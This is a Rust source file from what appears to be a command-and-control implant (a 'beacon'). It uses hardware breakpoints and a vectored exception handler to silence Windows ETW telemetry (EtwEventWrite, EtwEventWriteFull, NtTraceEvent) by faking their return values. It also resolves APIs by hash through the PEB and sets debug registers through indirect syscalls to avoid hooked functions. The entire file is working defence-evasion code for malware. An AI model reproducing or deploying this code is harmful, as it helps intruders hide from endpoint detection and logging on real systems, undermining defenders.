//! Hardware-breakpoint hooks: the beacon-side glue (the pure logic and the
//! pinned CONTEXT layout live in `specter_core::hwbp`).
//!
//! Bootstrap order matters: the VEH handler must be installed BEFORE the
//! debug registers are armed — an armed breakpoint without a handler is a
//! guaranteed crash. The handler is process-wide (VEH is global) but keys on
//! the instance through `gs`: exceptions raised on threads that are not the
//! beacon's pass through untouched.

use core::ffi::c_void;

use specter_core::fnv::fnv1a64;
use specter_core::hwbp::{
    self, Context, ExceptionPointers, HookTarget, Hooks, EXCEPTION_CONTINUE_EXECUTION,
    EXCEPTION_CONTINUE_SEARCH,
};

use crate::runtime::bootstrap;
use crate::runtime::syscalls::{self, Syscalls};

/// ntdll export hashes for the ETW surface (same neutralization as the
/// original: a clean synthesized return, zero bytes modified).
const H_ETW_EVENT_WRITE: u64 = fnv1a64(b"EtwEventWrite");
const H_ETW_EVENT_WRITE_FULL: u64 = fnv1a64(b"EtwEventWriteFull");
const H_NT_TRACE_EVENT: u64 = fnv1a64(b"NtTraceEvent");

/// kernel32 export hash for the VEH registration.
const H_ADD_VECTORED_EXCEPTION_HANDLER: u64 = fnv1a64(b"AddVectoredExceptionHandler");

/// `GetCurrentThread()` pseudo-handle: the current thread without a handle.
pub const CURRENT_THREAD: usize = 0xFFFF_FFFF_FFFF_FFFE;

/// The VEH handler: consumes single-step exceptions at the hooked ETW
/// addresses and synthesizes a clean return through the saved CONTEXT.
/// Every other exception passes through to the next handler.
///
/// # Safety
///
/// Installed by `install` with a valid `AddVectoredExceptionHandler`
/// pointer; reads the instance through `gs`, which is null on any thread
/// that is not the beacon's.
#[unsafe(no_mangle)]
unsafe extern "system" fn spt_veh(exception_pointers: *mut ExceptionPointers) -> i32 {
    let inst = bootstrap::instance();
    if inst.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if exception_pointers.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let record = (*exception_pointers).exception_record;
    let context = (*exception_pointers).context_record;
    if record.is_null() || context.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if hwbp::neutralize(context, &(*inst).etw_hooks, (*record).exception_code) {
        EXCEPTION_CONTINUE_EXECUTION
    } else {
        EXCEPTION_CONTINUE_SEARCH
    }
}

/// Resolve the ETW hook targets and the VEH installer. Non-resolved targets
/// are simply disabled (an address of 0 occupies no debug slot).
///
/// # Safety
///
/// `ntdll`/`kernel32` must be resolved module bases.
pub unsafe fn etw_hooks(ntdll: *mut c_void, kernel32: *mut c_void) -> (Hooks, usize) {
    let hook = |addr: *mut c_void, ret: u64| HookTarget {
        addr: addr as u64,
        ret_value: ret,
    };
    let hooks = [
        hook(peb_export(ntdll, H_ETW_EVENT_WRITE), 0),
        hook(peb_export(ntdll, H_ETW_EVENT_WRITE_FULL), 0),
        hook(peb_export(ntdll, H_NT_TRACE_EVENT), 0),
        HookTarget::disabled(),
    ];
    let add_veh = peb_export(kernel32, H_ADD_VECTORED_EXCEPTION_HANDLER);
    (hooks, add_veh as usize)
}

/// Cached find_export (kept tiny; the beacon has no other use for it here).
unsafe fn peb_export(module: *mut c_void, hash: u64) -> *mut c_void {
    if module.is_null() {
        return core::ptr::null_mut();
    }
    specter_core::peb::find_export(module, hash)
}

/// Install the VEH handler (first in the chain) and arm the debug registers
/// on the current thread. Returns false when the VEH could not be
/// installed — in that case the debug registers MUST NOT be armed.
///
/// # Safety
///
/// Must run on the thread whose registers are armed (the beacon thread),
/// with resolved modules and a valid syscall table.
pub unsafe fn install(
    sys: &Syscalls,
    hooks: &Hooks,
    add_veh: unsafe extern "system" fn(u32, *mut c_void) -> *mut c_void,
) -> bool {
    // The handler consumes exceptions before anything else sees them.
    let handle = add_veh(1, spt_veh as *mut c_void);
    if handle.is_null() {
        return false;
    }
    arm(sys, hooks)
}

/// Arm Dr0-Dr3 on the current thread through indirect syscalls — no
/// GetThreadContext/SetThreadContext via the IAT-hookable winapi.
///
/// # Safety
///
/// The syscall table must carry valid NtGet/NtSetContextThread SSNs and a
/// gadget; the VEH handler must already be installed.
pub unsafe fn arm(sys: &Syscalls, hooks: &Hooks) -> bool {
    let gadget = syscalls::gadget(sys, 0);
    let mut ctx = Context::arm_scratch();
    let get = syscalls::indirect_syscall2(
        sys.get_ctx_ssn,
        gadget,
        CURRENT_THREAD,
        &mut ctx as *mut Context as usize,
    );
    if get < 0 {
        return false;
    }
    hwbp::arm_context(&mut ctx, hooks);
    let set = syscalls::indirect_syscall2(
        sys.set_ctx_ssn,
        gadget,
        CURRENT_THREAD,
        &mut ctx as *mut Context as usize,
    );
    set >= 0
}
